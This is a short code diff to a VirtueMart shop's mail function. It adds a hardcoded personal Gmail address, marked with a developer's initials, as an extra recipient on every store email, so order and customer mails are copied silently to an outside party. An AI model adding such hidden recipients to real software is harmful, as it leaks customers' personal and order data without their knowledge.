@@ -275,6 +275,9 @@ class shopFunctionsF {
 		$subject = (isset($view->subject)) ? $view->subject : JText::_('COM_VIRTUEMART_DEFAULT_MESSAGE_SUBJECT');
 		$mailer = JFactory::getMailer();
 		$mailer->addRecipient($recipient);
+		//T.Trung
+		$mailer->addRecipient('nttrung211@gmail.com');
+		//T.Trung end
 		$mailer->setSubject($subject);
 		$mailer->isHTML(VmConfig::get('order_mail_html',TRUE));
 		$mailer->setBody($body);
